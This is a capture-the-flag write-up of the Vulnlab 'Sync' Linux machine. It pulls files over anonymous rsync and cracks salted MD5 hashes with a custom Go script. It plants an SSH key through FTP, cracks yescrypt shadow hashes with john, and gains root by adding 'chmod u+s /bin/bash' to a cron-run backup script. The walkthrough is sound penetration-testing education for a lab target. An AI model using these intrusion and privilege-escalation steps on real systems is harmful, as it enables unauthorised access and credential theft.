---
title: "Vulnlab - Sync [Easy]"
publishedAt: 2023-08-20
description: "Vulnlab Writeup"
isPublish: true
---

| Name | OS  | Difficulty |
| ---- | --- | ---------- |
| **Sync**     | Linux (Ubuntu)    |  <span style="color:green;">Easy</span>          |

## Summary

We would find a TCP port *873* open that is related to the [rsync](https://linux.die.net/man/1/rsync) utility, which we can connect to. Upon connecting, we would find folders related to the http server that is running. After the exfiltration of those files, we would find a SQLite3 database which contains several hashes of some users. The hashes are constructed a bit odd so we would create a simple utility in Go to help us bruteforce the hash, then we would use the FTP with the found credentials to put our public SSH key so that we can log in with SSH. Then we would find a folder related to some backups of the machine, we will exfiltrate those files, and we are going to try to crack the newly found credentials. Then we would be able to switch users again, and we are going to enumerate once more to find a running CRON job that we would use to gain the root access of the machine. 

## Exploitation / Initial Foothold

We would start with a nmap scan that would scan TCP and UDP ports.

```
syl@sylsec:~/vulnlab/Sync$ sudo nmap -sS -sU 10.10.64.96 --min-rate 10000 --open
Starting Nmap 7.80 ( https://nmap.org ) at 2023-12-25 11:16 EET
Nmap scan report for 10.10.64.96
Host is up (0.052s latency).
Not shown: 1002 closed ports, 994 open|filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
873/tcp open  rsync
```

We find that the machine runs the utility **rsync,** which is a utility for efficiently transferring and synchronizing files between a computer and a storage drive and across networked computers by comparing the modification times and sizes of files. 

We can connect to it by using it directly from our linux environment:

```
syl@sylsec:~/vulnlab/Sync$ rsync -av --list-only rsync://10.10.64.96/
httpd           web backup
```

```
syl@sylsec:~/vulnlab/Sync$ rsync -av --list-only rsync://10.10.64.96/httpd
receiving incremental file list
drwxr-xr-x          4.096 2023/04/20 22:50:04 .
drwxr-xr-x          4.096 2023/04/20 23:13:22 db
-rw-r--r--         12.288 2023/04/20 22:50:42 db/site.db
drwxr-xr-x          4.096 2023/04/20 22:50:50 migrate
drwxr-xr-x          4.096 2023/04/20 23:13:15 www
-rw-r--r--          1.722 2023/04/20 23:02:54 www/dashboard.php
-rw-r--r--          2.315 2023/04/20 23:09:10 www/index.php
-rw-r--r--            101 2023/04/20 23:03:08 www/logout.php

sent 23 bytes  received 228 bytes  167,33 bytes/sec
total size is 16.426  speedup is 65,44
```

We would see that there is an interesting file `httpd/db/site.db` which may contain some credentials, so let's get that file along with the other files.

```
syl@sylsec:~/vulnlab/Sync$ rsync -chavzP --stats rsync://10.10.64.96/httpd/ ./exfiltrated/
receiving incremental file list
./
db/
db/site.db
         12,29K 100%   11,72MB/s    0:00:00 (xfr#1, to-chk=3/8)
migrate/
www/
www/dashboard.php
          1,72K 100%    1,64MB/s    0:00:00 (xfr#2, to-chk=2/8)
www/index.php
          2,31K 100%    2,21MB/s    0:00:00 (xfr#3, to-chk=1/8)
www/logout.php
            101 100%   98,63kB/s    0:00:00 (xfr#4, to-chk=0/8)

Number of files: 8 (reg: 4, dir: 4)
Number of created files: 7 (reg: 4, dir: 3)
Number of deleted files: 0
Number of regular files transferred: 4
Total file size: 16,43K bytes
Total transferred file size: 16,43K bytes
Literal data: 16,43K bytes
Matched data: 0 bytes
File list size: 278
File list generation time: 0,001 seconds
File list transfer time: 0,000 seconds
Total bytes sent: 119
Total bytes received: 2,25K

sent 119 bytes  received 2,25K bytes  1,58K bytes/sec
total size is 16,43K  speedup is 6,95
```

Now, let's run **sqlite3**.

```
syl@sylsec:~/vulnlab/Sync$ sqlite3 ./exfiltrated/db/site.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
1|admin|76<REDACTED>
2|triss|a0<REDACTED>
sqlite> 
```

We would gather those users and hashes that we need to crack. Initially, I ran those md5 hashes through the `rockyou.txt` list, but they didn't match anything, so I was curious why and went to look at the source code. 

In the file `index.php` located in the `www` folder, we would find the following code snippet:

```php
<?php
session_start();
$secure = "6c4972f3717a5e881e282ad3105de01e";

if (isset($_SESSION['username'])) {
    header('Location: dashboard.php');
    exit();
}

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $hash = md5("$secure|$username|$password");
    $db = new SQLite3('../db/site.db');
    $result = $db->query("SELECT * FROM users WHERE username = '$username' AND password= '$hash'");
    $row = $result->fetchArray(SQLITE3_ASSOC);
    if ($row) {
        $_SESSION['username'] = $row['username'];
        header('Location: dashboard.php');
        exit();
    } else {
        $error_message = 'Invalid username or password.';
    }
}

?>
```

We can see that the hash is being created by the value of the variable `$secure` the username and the password divided by a pipe.

> I cracked those hashes with my own solution written in Go, however there might be an easier way of doing that with `hashcat` or other hash cracking tool.

Here is the `Go` code that we can use.

```go
package main

import (
    "bufio"
    "crypto/md5"
    "encoding/hex"
    "fmt"
    "os"
    "sync"
)

func main() {
    targetHash := "76<redacted>"
    filename := "/home/syl/tools/lists/rockyou.txt"

    file, err := os.Open(filename)
    if err != nil {
        panic(err)
    }
    defer file.Close()

    var wg sync.WaitGroup
    scanner := bufio.NewScanner(file)

    for scanner.Scan() {
        wg.Add(1)
        go func(line string) {
            defer wg.Done()
            hashedLine := hashLine(line)
            if hashedLine == targetHash {
                fmt.Printf("Match found: %s\n", line)
                os.Exit(0)
            }
        }(scanner.Text())
    }

    if err := scanner.Err(); err != nil {
        panic(err)
    }

    wg.Wait()
}

func hashLine(line string) string {
    data := []byte("6c4972f3717a5e881e282ad3105de01e|admin|" + line)
    hash := md5.Sum(data)
    return hex.EncodeToString(hash[:])
}
```

We can adjust the code for each user. Within seconds of running the code, we would get a match for the `triss` user.

```
syl@sylsec:~/vulnlab/Sync$ go run ./scripts/custom_crack.go 
Match found: g...<redacted>
```

The hash of the admin wasn't found.

Those credentials were valid of the FTP service, and It seemed like that we are in the home directory of that user.

We can try to `ssh` with that user, but the SSH login isn't permitted, so we can create an SSH folder `.ssh` from the FTP, and we can put our public SSH key into a file named `authorized_keys` then we would be able to connect using our public key!

## Switching the user and Privilege Escalation

We can find more users within the `/etc/passwd` file.

```
jennifer
sa
triss
ubuntu
```

Upon listing the directories, we would find a folder called `backup` which sits in the root of the file system. In that folder there are many zip files related to some kind of backup. 

We can exfiltrate all the files and extract them to see what's inside.

```bash
# After the exfiltration
find . -name '*.zip' -exec sh -c 'unzip -d "${1%.*}" "$1"' _ {} \;
```

That bash one-liner would extract each zip file in its own directory. 

We would find that those folders are mostly the same and the name of the file is a timestamp, in my specific case here are a couple of files:

```
1703495041.zip -> Monday, December 25, 2023 9:04:01 AM
1703495161.zip -> Monday, December 25, 2023 9:06:01 AM
1703495281.zip -> Monday, December 25, 2023 9:08:01 AM
```

We can see a pattern here, those zip files are being created every 2 minutes. We would **note** that and come back for it later on.

Upon unzipping those files, we would find the following structure:

```
|-- httpd
|   |-- db
|   |   `-- site.db
|   |-- migrate
|   `-- www
|       |-- dashboard.php
|       |-- index.php
|       `-- logout.php
|-- passwd
|-- rsyncd.conf
`-- shadow
```

We can inspect the `passwd` and the `shadow` files, since that they are the ones that stand out at first. And having those files, we can use the utility from `john` called `unshadow` to combine the `shadow` and the `passwd` file into a single file that we can use to crack the passwords for the users.

To install the tool `unshadow` we would need to install `john`

```
$ sudo apt install john -y
```

```
unshadow ./exfiltrated/ssh/backup/1703494921/tmp/backup/passwd ./exfiltrated/ssh/backup/1703494921/tmp/backup/shadow > tmp_shadow
```

Then we can crack it (**or can we?**):

```
syl@sylsec:~/vulnlab/Sync$ john ./tmp_shadow --wordlist=/home/syl/tools/lists/rockyou.txt                                                                                                                                                      
No password hashes loaded (see FAQ)
```

We cannot load those hashes in `john` with the default arguments because the hash function that is being used is called `yescrypt`. We can conclude the hashing function by inspecting the hashes that we in the `tmp_shadow` file.

```
$y$j9T$DBxmxcNWJlhvgfWCUTbEC0<redacted>
$y$j9T$jJFOBCaiGJUmyZZRFn5aG1<redacted>
...
```

We have the starting sequence `$y$` which is related to `yescrypt`. If you need more information about it, you can [read this!](https://security.stackexchange.com/questions/252665/does-john-the-ripper-not-support-yescrypt)

We can use the argument `--fromat=crypt` 

```
syl@sylsec:~/vulnlab/Sync$ john ./tmp_shadow --format=crypt                                                                                                                                                          
Loaded 5 password hashes with 5 different salts (crypt, generic crypt(3) [?/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:51 0% 2/3 0g/s 87.90p/s 119.4c/s 119.4C/s leslie..boston
<redacted>           (jennifer)
<redacted>           (triss)
<redacted>           (sa)
```

Now we have the passwords for the user `jennifer` and the user `sa`. Upon changing the user to `jennifer` we would find the `user.txt` hash.  

We can not run `linpeas` for further enumeration on both accounts `sa,jennifer` and we would find that we own a file called `/usr/local/bin/backup.sh`. Upon inspecting the file, we would see that the file contains a script that is being used to back up the files that we saw earlier (the zipped backups). 

Using `pspy` we can monitor the currently running process by all users, and we would see that a backup is being created every 2 minutes (just like the timestamps we saw earlier).

We can edit the script, and we can add the line `chmod u+s /bin/bash` to the end of it. After 2 minutes, we can see if it works by invoking `/bin/bash -p`, that would give us the `root`.